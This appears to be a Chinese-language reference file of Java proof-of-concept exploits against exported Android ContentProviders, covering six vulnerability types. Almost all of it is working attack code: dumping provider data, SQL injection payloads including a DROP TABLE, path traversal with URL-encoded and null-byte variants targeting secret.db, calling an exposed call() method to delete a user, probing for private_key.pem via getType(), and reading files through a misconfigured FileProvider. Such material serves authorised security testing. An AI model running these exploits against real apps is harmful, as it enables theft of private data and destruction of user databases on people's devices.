---
name: poc-app-provider
description: ContentProvider 组件攻击 PoC — 覆盖数据泄露、SQL 注入、路径遍历、call 暴露、getType 泄露、FileProvider 配置错误 6 种漏洞类型
---

# ContentProvider 组件攻击 PoC

ContentProvider 是数据共享核心机制，导出的 Provider 可被任意应用查询，攻击面包括 SQL 注入、路径遍历、敏感数据泄露等。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| 数据泄露 | HIGH | `ProviderDataLeakExploit` |
| SQL 注入 | HIGH | `ProviderSqlInjectionExploit` |
| 路径遍历 | HIGH | `ProviderPathTraversalExploit` |
| call() 方法暴露 | MEDIUM | `ProviderCallExposeExploit` |
| getType() 信息泄露 | LOW | `ProviderGetTypeInfoLeakExploit` |
| FileProvider 配置错误 | HIGH | `ProviderFileProviderMisconfigExploit` |

## ProviderDataLeakExploit

直接查询导出 Provider 获取敏感数据。

```java
public class ProviderDataLeakExploit extends Exploit {
    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider/users");
        queryAndLog(uri, null, null, null, null);
    }

    private void queryAndLog(Uri uri, String[] projection, String selection,
                             String[] selectionArgs, String sortOrder) {
        try {
            Cursor cursor = context.getContentResolver()
                .query(uri, projection, selection, selectionArgs, sortOrder);
            if (cursor != null) {
                log("Columns: " + Arrays.toString(cursor.getColumnNames()));
                log("Row count: " + cursor.getCount());
                while (cursor.moveToNext()) {
                    StringBuilder row = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        row.append(cursor.getColumnName(i)).append("=")
                           .append(cursor.getString(i)).append(" | ");
                    }
                    log(row.toString());
                }
                cursor.close();
            } else {
                log("Cursor is null");
            }
        } catch (Exception e) {
            log("Query failed: " + e.getMessage());
        }
    }
}
```

## ProviderSqlInjectionExploit

通过 selection/sortOrder 参数注入 SQL 语句。

```java
public class ProviderSqlInjectionExploit extends Exploit {
    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider/data");

        // selection 参数注入
        String injection = "1=1 UNION SELECT * FROM secrets--";
        queryAndLog(uri, null, injection, null, null);

        // sortOrder 参数注入
        queryAndLog(uri, null, null, null, "1; DROP TABLE users--");
    }
}
```

## ProviderPathTraversalExploit

通过 openFile() 路径穿越读取任意文件。

```java
public class ProviderPathTraversalExploit extends Exploit {
    @Override
    public void execute() {
        // 方式 1：标准路径穿越
        Uri traversal = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
        openAndLog(traversal);

        // 方式 2：URL 编码绕过
        Uri encoded = Uri.parse("content://com.target.provider/files/..%2F..%2F..%2Fdata%2Fdata%2Fcom.target%2Fdatabases%2Fsecret.db");
        openAndLog(encoded);

        // 方式 3：空字节截断（旧版本）
        Uri nullByte = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db%00.png");
        openAndLog(nullByte);
    }

    private void openAndLog(Uri uri) {
        try {
            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r");
            if (pfd != null) {
                FileInputStream fis = new FileInputStream(pfd.getFileDescriptor());
                byte[] buf = new byte[1024];
                int len = fis.read(buf);
                log("Read " + len + " bytes from: " + uri);
                fis.close();
                pfd.close();
            }
        } catch (Exception e) {
            log("Open failed: " + e.getMessage());
        }
    }
}
```

## ProviderCallExposeExploit

调用 Provider 暴露的 call() 方法执行敏感操作。

```java
public class ProviderCallExposeExploit extends Exploit {
    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider");
        Bundle extras = new Bundle();
        extras.putString("method", "deleteUser");
        extras.putString("user_id", "1");

        try {
            Bundle result = context.getContentResolver().call(uri, "custom_method", null, extras);
            if (result != null) {
                log("call() result: " + result.getString("result"));
            }
        } catch (Exception e) {
            log("call() failed: " + e.getMessage());
        }
    }
}
```

## ProviderGetTypeInfoLeakExploit

通过 getType() 返回值差异枚举文件是否存在。

```java
public class ProviderGetTypeInfoLeakExploit extends Exploit {
    @Override
    public void execute() {
        String[] paths = {
            "/data/data/com.target/shared_prefs/secrets.xml",
            "/data/data/com.target/databases/secret.db",
            "/data/data/com.target/files/private_key.pem",
        };
        for (String path : paths) {
            Uri uri = Uri.parse("content://com.target.provider/files" + path);
            String type = context.getContentResolver().getType(uri);
            boolean exists = type != null;
            log(path + " → " + (exists ? "EXISTS (" + type + ")" : "NOT FOUND"));
        }
    }
}
```

## ProviderFileProviderMisconfigExploit

利用 FileProvider 配置错误（root-path 或 exported=true）访问任意文件。

```java
public class ProviderFileProviderMisconfigExploit extends Exploit {
    @Override
    public void execute() {
        // 目标 FileProvider 使用 <root-path> 配置，可访问任意路径
        // 或 FileProvider exported=true（Android 7.0 以下）
        Uri targetFile = Uri.parse("content://com.target.fileprovider/root/data/data/com.target/shared_prefs/config.xml");
        openAndLog(targetFile);
    }

    private void openAndLog(Uri uri) {
        try {
            InputStream is = context.getContentResolver().openInputStream(uri);
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String line;
                while ((line = reader.readLine()) != null) {
                    log(line);
                }
                is.close();
            }
        } catch (Exception e) {
            log("Read failed: " + e.getMessage());
        }
    }
}
```
